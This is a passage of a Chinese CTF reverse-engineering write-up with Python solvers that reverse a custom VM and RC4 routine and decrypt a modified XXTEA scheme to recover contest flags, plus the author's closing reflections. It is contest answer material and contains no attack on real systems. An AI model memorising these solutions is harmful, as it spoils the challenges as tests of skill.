        -2080606283: (2, 3, 159), -2080604239: (204, 41, 53), -2038638651: (204, 7, 128),
        -2038636607: (5, 8, 5), -2030225643: (204, 37, 4), -2030223599: (3, 9, 82),
        -2021845211: (4, 36, 2), -2021843167: (204, 46, 51), -1703914110: (2, 0, 27),
        -1703912058: (3, 17, 103), -1695435438: (3, 24, 159), -1695433386: (4, 21, 5),
        -1687055006: (4, 5, 7), -1687052954: (5, 12, 3), -1678740046: (3, 41, 157),
        -1678737994: (1, 29, 140), -1636772414: (204, 30, 249), -1636770362: (2, 7, 30),
        -1628359406: (4, 1, 1), -1628357354: (2, 37, 139), -1619978974: (2, 46, 153),
        -1619976922: (4, 40, 1), -1435971188: (5, 19, 4), -1435969144: (1, 22, 172),
        -1427558052: (5, 19, 4), -1427556008: (3, 13, 188), -1419177620: (2, 41, 133),
        -1419175576: (1, 46, 39), -1410797124: (5, 42, 7), -1410795080: (2, 15, 211),
        -1368895028: (2, 27, 199), -1368892984: (2, 38, 237), -1360416484: (4, 39, 5),
        -1360414440: (204, 4, 12), -1352036052: (4, 4, 5), -1352034008: (204, 21, 20),
        -1343720964: (3, 25, 231), -1343718920: (4, 15, 2), -1302015093: (3, 22, 84),
        -1302013041: (3, 13, 161), -1293601957: (2, 12, 27), -1293599905: (5, 14, 4),
        -1285221525: (3, 5, 124), -1285219473: (5, 0, 5), -1276841029: (2, 28, 16),
        -1276838977: (204, 42, 58), -1234938933: (204, 38, 93), -1234936881: (204, 27, 229),
        -1226460389: (5, 7, 6), -1226458337: (4, 20, 4), -1218079957: (5, 32, 4),
        -1218077905: (4, 6, 3), -1209764869: (204, 15, 137), -1209762817: (204, 25, 159),
        -1038342243: (5, 20, 6), -1038340199: (204, 17, 49), -1029847219: (3, 36, 114),
        -1029845175: (5, 40, 4), -1021450371: (1, 11, 109), -1021448327: (3, 27, 168),
        -1013184595: (3, 39, 202), -1013182551: (2, 35, 74), -971200547: (204, 9, 81),
        -971198503: (204, 31, 58), -962771187: (3, 33, 126), -962769143: (2, 34, 172),
        -954374339: (2, 34, 197), -954372295: (4, 36, 7), -636476006: (3, 17, 231),
        -636473954: (4, 6, 5), -627980982: (3, 42, 93), -627978930: (1, 10, 38),
        -619584134: (5, 7, 4), -619582082: (5, 32, 2), -611318358: (3, 27, 118),
        -611316306: (4, 5, 7), -569334310: (2, 31, 83), -569332258: (5, 9, 3),
        -560904950: (204, 3, 89), -560902898: (1, 25, 79), -552508102: (4, 44, 6),
        -552506050: (204, 10, 161), -368533100: (2, 2, 179), -368531056: (2, 22, 160),
        -360103612: (5, 2, 5), -360101568: (5, 34, 2), -351706764: (5, 43, 1),
        -351704720: (3, 35, 4), -343375452: (5, 47, 6), -343373408: (1, 6, 12),
        -301456940: (5, 18, 7), -301454896: (204, 23, 205), -292962044: (204, 36, 150),
        -292960000: (5, 33, 7), -284565196: (204, 35, 219), -284563152: (4, 28, 2),
        -276299292: (2, 45, 88), -276297248: (1, 0, 54), -234577005: (1, 15, 192),
        -234574953: (4, 35, 5), -226147517: (2, 4, 198), -226145465: (2, 4, 205),
        -217750669: (4, 35, 5), -217748617: (5, 26, 5), -209419357: (5, 8, 4),
        -209417305: (1, 15, 181), -167500845: (1, 9, 147), -167498793: (204, 18, 215),
        -159005949: (4, 23, 5), -159003897: (5, 16, 2), -150609101: (4, 26, 5),
        -150607049: (5, 31, 2), -142343197: (204, 0, 59), -142341145: (204, 45, 120),
        37533589: (204, 2, 225), 37535633: (5, 21, 5), 45963077: (5, 12, 3),
        45965121: (4, 36, 2), 54359925: (3, 17, 129), 54361969: (3, 46, 26),
        62691237: (1, 37, 235), 62693281: (3, 9, 112), 104609749: (1, 23, 127),
        104611793: (204, 14, 166), 113104645: (1, 29, 96), 113106689: (204, 40, 148),
        121501493: (204, 5, 92), 121503537: (4, 25, 7), 129767397: (204, 43, 68),
        129769441: (204, 1, 98), 439399826: (3, 38, 94), 439401878: (3, 2, 213),
        447829314: (2, 42, 221), 447831366: (1, 28, 54), 456226162: (1, 25, 229),
        456228214: (1, 24, 74), 464557474: (5, 33, 7), 464559526: (1, 30, 15),
        506475986: (1, 14, 209), 506478038: (5, 38, 7), 514970882: (4, 40, 4),
        514972934: (204, 16, 51), 523367730: (204, 26, 75), 523369782: (1, 5, 244),
        531633634: (3, 1, 33), 531635686: (5, 43, 1), 707277212: (204, 12, 239),
        707279256: (2, 16, 88), 715772236: (5, 44, 1), 715774280: (2, 45, 156),
        724169084: (4, 39, 5), 724171128: (2, 16, 34), 732434860: (3, 24, 146),
        732436904: (5, 31, 7), 774418908: (5, 8, 4), 774420952: (4, 22, 2),
        782848268: (5, 47, 6), 782850312: (204, 33, 57), 791245116: (3, 45, 118),
        791247160: (3, 44, 32), 841233307: (3, 6, 232), 841235359: (1, 27, 119),
        849728331: (1, 16, 175), 849730383: (5, 10, 3), 858125179: (4, 1, 1),
        858127231: (1, 37, 237), 866390955: (3, 3, 185), 866393007: (204, 24, 21),
        908375003: (204, 22, 174), 908377055: (204, 8, 221), 916804363: (3, 3, 21),
        916806415: (204, 47, 87), 925201211: (1, 11, 27), 925203263: (4, 10, 5),
        1113376653: (3, 18, 55), 1113378697: (5, 43, 1), 1121789789: (1, 26, 14),
        1121791833: (5, 29, 1), 1130170221: (4, 45, 6), 1130172265: (3, 2, 56),
        1138550717: (3, 24, 65), 1138552761: (204, 19, 218), 1180452813: (204, 29, 40),
        1180454857: (204, 44, 197), 1188931357: (3, 4, 108), 1188933401: (204, 13, 214),
        1197311789: (4, 21, 5), 1197313833: (4, 14, 1), 1205626877: (204, 28, 55),
        1205628921: (204, 39, 165), 1515242890: (2, 19, 89), 1515244942: (2, 20, 212),
        1523656026: (2, 1, 178), 1523658078: (3, 46, 60), 1532036458: (5, 30, 4),
        1532038510: (4, 43, 4), 1540416954: (3, 19, 211), 1540419006: (3, 40, 236),
        1582319050: (1, 44, 235), 1582321102: (2, 29, 238), 1590797594: (4, 13, 3),
        1590799646: (204, 20, 1), 1599178026: (204, 32, 171), 1599180078: (204, 6, 241),
        1607493114: (4, 39, 7), 1607495166: (3, 28, 242), 1783120260: (2, 38, 20),
        1783122304: (4, 47, 5), 1791598932: (3, 18, 234), 1791600976: (2, 3, 32),
        1799979364: (5, 32, 3), 1799981408: (5, 42, 3), 1808294324: (5, 41, 1),
        1808296368: (4, 10, 7), 1850261956: (3, 34, 151), 1850264000: (4, 0, 3),
        1858674964: (1, 47, 208), 1858677008: (2, 11, 45), 1867055396: (2, 7, 12),
        1867057440: (5, 31, 6), 1875436020: (-1, 0, 0), 1917076355: (1, 23, 85),
        1917078407: (4, 26, 3), 1925555027: (4, 17, 7), 1925557079: (4, 21, 2),
        1933935459: (2, 13, 228), 1933937511: (4, 30, 7), 1942250419: (4, 18, 6),
        1942252471: (4, 20, 6), 1984218051: (2, 30, 217), 1984220103: (204, 34, 144),
        1992631059: (204, 11, 49), 1992633111: (1, 11, 84), 2001011491: (4, 37, 5),
        2001013543: (2, 14, 97),
    }
    return instructions.get(index)


# 逆向VM操作
def reverse_vm_operations(final_state, operations):
    data = list(final_state)

    # 逆序执行操作
    for op, idx, param in reversed(operations):
        if op == 1:  # ADD -> SUB
            data[idx] = (data[idx] - param) & 0xFF
        elif op == 2:  # SUB -> ADD
            data[idx] = (data[idx] + param) & 0xFF
        elif op == 3:  # XOR -> XOR (自逆)
            data[idx] = (data[idx] ^ param) & 0xFF
        elif op == 4:  # ROL -> ROR
            data[idx] = ror(data[idx], param)
        elif op == 5:  # ROR -> ROL
            data[idx] = rol(data[idx], param)

    return bytes(data)


# RC4解密 (与加密相同)
def rc4_decrypt(ciphertext, key):
    box = [(255 - i) ^ 131 for i in range(256)]

    x = 0
    for i in range(256):
        x = (x + box[i] + key[(i + 72) % len(key)]) % 256
        box[i], box[x] = box[x], box[i]

    x = 0
    y = 0
    output = []
    for i in range(len(ciphertext)):
        x = (x + 3) % 256
        y = (y - box[x]) & 0xFF
        box[x], box[y] = box[y], box[x]
        index = (box[x] ^ box[y]) % 256
        output.append(((ciphertext[i] ^ 119) - box[index]) & 0xFF)

    return bytes(output)


# 主解密函数
def solve():
    key = b"4r3_y0U_a_Jv4V_m4s73R?"

    # 提取操作和检查值
    operations, checks = extract_operations()

    # 构造VM执行后的最终状态
    final_state = [0] * 48
    for idx, val in checks.items():
        final_state[idx] = val

    print("Final state after VM:", bytes(final_state).hex())

    # 逆向VM操作得到RC4加密后的数据
    after_rc4 = reverse_vm_operations(final_state, operations)
    print("After reversing VM:", after_rc4.hex())

    # RC4解密得到flag
    flag = rc4_decrypt(after_rc4, key)
    print(f"\nFlag: {flag.decode('ascii', errors='ignore')}")

    return flag


if __name__ == "__main__":
    flag = solve()

```

## 魔法少女的秘密

用blutter解出来，然后比较明显一个加密一个调用

drink.dart有明显XXTEA特征但是有魔改，用高级一点的**可以分析出来（开始用的ds幻觉有点严重了

然后密文参考了出题人的博客确定是要除2（前面gpt5 thinking是这样说的但是别的都说%256，难绷

```
#  本文作者： PangBai @𝕺𝖚𝖗 𝕷𝖎𝖋𝖊
#  本文链接： https://pangbai.work/CTF/Reverse/Want2BecomeMagicalGirl/
#  版权声明： 本站所有文章除特别声明外，均采用 (CC)BY-NC-SA 许可协议。转载请注明出处！

aesKeyBytes 来自静态数组 [2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32] 刚好 16 位，但是都是 2 的倍数， keyBytes 来自两个 list 拼接 ( addAll )，其中一部分在选自静态数组 [2, 2, 8, 10] , [126, 70, 6, 426] 另一部分来自 getKey ， 可以察觉到不对了，AES 传入的密钥都是 byte 类型，但是这里有数据超过 255，并且不存在奇数，除 2 之后 [1,1,4,5] ，瞬间可以要素察觉了，这里的所有 byte 都是左移 1 位的。同时 finalKeyBytes 的最终值取决于 getSym 返回的第八位是否等于 0xD6 。
```

主要还是变量太多搞的脑子越做越乱了吧（一直以为有什么奇怪的地方会把密文改掉，要是有root机可能动调就不会怀疑这里了。。，前面的XXTEA只分析出了delta别的没分析出来）

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

class ModifiedXXTEA:
    """修改版XXTEA加密算法"""

    DELTA = 0x114514  # 修改的delta值

    @staticmethod
    def _to_uint32(n):
        """转换为32位无符号整数"""
        return n & 0xFFFFFFFF

    @staticmethod
    def _to_int32(n):
        """转换为32位有符号整数"""
        n = n & 0xFFFFFFFF
        return n if n < 0x80000000 else n - 0x100000000

    def encrypt(self, data, key):
        """
        加密函数
        :param data: 要加密的uint32数组
        :param key: 密钥uint32数组(长度应为4)
        :return: 加密后的uint32数组
        """
        if len(data) < 2:
            raise ValueError("Data length must be at least 2")
        if len(key) != 4:
            raise ValueError("Key length must be 4")

        n = len(data)
        v = list(data)  # 复制数据
        k = list(key)  # 复制密钥

        # 计算轮数: (52 // n) + 6
        rounds = (52 // n) + 6

        sum_val = 0
        z = v[n - 1]

        # 主循环
        for _ in range(rounds):
            sum_val = self._to_uint32(sum_val + self.DELTA)
            e = (sum_val >> 2) & 3

            # 处理除最后一个元素外的所有元素
            for p in range(n - 1):
                y = v[p + 1]

                # 修改的MX函数
                mx = self._calculate_mx(v[p], y, z, sum_val, p, e, k)
                v[p] = self._to_uint32(v[p] + mx)
                z = v[p]

            # 特殊处理最后一个元素
            y = v[0]
            mx = self._calculate_mx(v[n - 1], y, z, sum_val, n - 1, e, k)
            v[n - 1] = self._to_uint32(v[n - 1] + mx)
            z = v[n - 1]

        return v

    def _calculate_mx(self, current, next_val, prev_val, sum_val, p, e, key):
        """
        计算修改后的MX值
        """
        # 计算 (prev>>5) ^ (next<<2)
        part1 = self._to_uint32((prev_val >> 5) ^ (next_val << 2))

        # 计算 (next>>3) ^ (prev<<4)
        part2 = self._to_uint32((next_val >> 3) ^ (prev_val << 4))

        # part1 + part2
        temp1 = self._to_uint32(part1 + part2)

        # sum ^ next
        temp2 = self._to_uint32(sum_val ^ next_val)

        # 修改的索引计算: ((p&3) ^ (e&3))
        key_idx = ((p & 3) ^ (e & 3)) & 3

        # key[idx] ^ prev
        temp3 = self._to_uint32(key[key_idx] ^ prev_val)

        # (temp2 + temp3) ^ temp1
        mx = self._to_uint32((temp2 + temp3) ^ temp1)

        return mx

    def decrypt(self, data, key):
        """
        解密函数
        :param data: 要解密的uint32数组
        :param key: 密钥uint32数组(长度应为4)
        :return: 解密后的uint32数组
        """
        if len(data) < 2:
            raise ValueError("Data length must be at least 2")
        if len(key) != 4:
            raise ValueError("Key length must be 4")

        n = len(data)
        v = list(data)
        k = list(key)

        # 计算轮数
        rounds = (52 // n) + 6

        # 计算最终的sum值
        sum_val = self._to_uint32(rounds * self.DELTA)

        y = v[0]

        # 反向主循环
        for _ in range(rounds):
            e = (sum_val >> 2) & 3

            # 反向处理最后一个元素
            z = v[n - 2] if n > 2 else v[0]
            mx = self._calculate_mx(v[n - 1], y, z, sum_val, n - 1, e, k)
            v[n - 1] = self._to_uint32(v[n - 1] - mx)
            z = v[n - 1]

            # 反向处理其他元素
            for p in range(n - 2, -1, -1):
                y = v[p]
                z_prev = v[p - 1] if p > 0 else v[n - 1]
                mx = self._calculate_mx(v[p], v[p + 1], z_prev, sum_val, p, e, k)
                v[p] = self._to_uint32(v[p] - mx)

            sum_val = self._to_uint32(sum_val - self.DELTA)
            y = v[0]

        return v


def bytes_to_uint32_array(data, endian='little'):
    """
    将字节数组转换为uint32数组
    :param data: 字节数组
    :param endian: 字节序 'little' 或 'big'
    :return: uint32数组
    """
    if len(data) % 4 != 0:
        raise ValueError("Data length must be multiple of 4")

    result = []
    for i in range(0, len(data), 4):
        if endian == 'little':
            # 小端序: 低字节在前
            val = (data[i]) | (data[i + 1] << 8) | (data[i + 2] << 16) | (data[i + 3] << 24)
        else:
            # 大端序: 高字节在前
            val = (data[i] << 24) | (data[i + 1] << 16) | (data[i + 2] << 8) | data[i + 3]
        result.append(val)

    return result


def uint32_array_to_bytes(data, endian='little'):
    """
    将uint32数组转换为字节数组
    :param data: uint32数组
    :param endian: 字节序 'little' 或 'big'
    :return: 字节数组
    """
    result = []
    for val in data:
        if endian == 'little':
            # 小端序
            result.extend([
                val & 0xFF,
                (val >> 8) & 0xFF,
                (val >> 16) & 0xFF,
                (val >> 24) & 0xFF
            ])
        else:
            # 大端序
            result.extend([
                (val >> 24) & 0xFF,
                (val >> 16) & 0xFF,
                (val >> 8) & 0xFF,
                val & 0xFF
            ])

    return bytes(result)


def string_to_uint32_array(s, endian='little'):
    """
    将字符串转换为uint32数组
    :param s: 字符串
    :param endian: 字节序
    :return: uint32数组
    """
    # 补齐到4的倍数
    padding_len = (4 - len(s) % 4) % 4
    s_bytes = s.encode('utf-8') + b'\x00' * padding_len
    return bytes_to_uint32_array(s_bytes, endian)


def main():
    # 密文和密钥
    ciphertext_bytes = bytes([134, 139, 225, 194, 10, 134, 7, 131, 88, 191, 107, 222,
                              52, 133, 87, 112, 194, 148, 71, 228, 191, 70, 1, 147,
                              123, 52, 228, 254, 20, 111, 81, 245, 110, 92, 93, 159,
                              129, 240, 231, 205])

    key_string = "ThisIsaKeywowowo"

    print("=" * 70)
    print("修改版XXTEA解密")
    print("=" * 70)

    # 尝试不同的字节序组合
    endian_combinations = [
        ('little', 'little'),  # 密文小端，密钥小端
        #('little', 'big'),  # 密文小端，密钥大端
        #('big', 'little'),  # 密文大端，密钥小端
        #('big', 'big'),  # 密文大端，密钥大端
    ]

    for cipher_endian, key_endian in endian_combinations:
        print(f"\n{'=' * 70}")
        print(f"尝试: 密文字节序={cipher_endian}, 密钥字节序={key_endian}")
        print(f"{'=' * 70}")

        try:
            # 转换密文为uint32数组
            ciphertext = bytes_to_uint32_array(ciphertext_bytes, cipher_endian)
            print(f"\n密文 (uint32数组):")
            print(f"  {[hex(x) for x in ciphertext]}")

            # 转换密钥为uint32数组
            key = string_to_uint32_array(key_string, key_endian)
            print(f"\n密钥 '{key_string}' (uint32数组):")
            print(f"  {[hex(x) for x in key]}")

            # 解密
            cipher = ModifiedXXTEA()
            decrypted = cipher.decrypt(ciphertext, key)

            print(f"\n解密结果 (uint32数组):")
            print(f"  {[hex(x) for x in decrypted]}")

            # 转换为字节并尝试解码
            decrypted_bytes = uint32_array_to_bytes(decrypted, cipher_endian)

            print(f"\n解密结果 (字节):")
            print(f"  {decrypted_bytes.hex()}")
            print(f"  {list(decrypted_bytes)}")

            # 尝试解码为ASCII/UTF-8
            try:
                # 移除尾部的空字节和不可打印字符
                decoded = decrypted_bytes.rstrip(b'\x00').decode('utf-8', errors='ignore')
                if decoded and all(32 <= ord(c) < 127 or c in '\n\r\t' for c in decoded):
                    print(f"\n✓ 解密成功 (可打印字符串):")
                    print(f"  '{decoded}'")
                else:
                    print(f"\n尝试解码:")
                    print(f"  '{decoded}'")
            except Exception as e:
                print(f"\n无法解码为UTF-8: {e}")

            # 验证：重新加密看是否得到原密文
            re_encrypted = cipher.encrypt(decrypted, key)
            if re_encrypted == ciphertext:
                print(f"\n✓ 验证成功: 重新加密后与原密文一致")
            else:
                print(f"\n✗ 验证失败: 重新加密后与原密文不一致")

        except Exception as e:
            print(f"\n✗ 错误: {e}")
            import traceback
            traceback.print_exc()


if __name__ == "__main__":
    main()
```





打了5个week，压力有点爆大了，但是还是很开心的，遇到了很多又热心又强的出题人大哥和其他超级天赋选手，好玩爱玩，明年还玩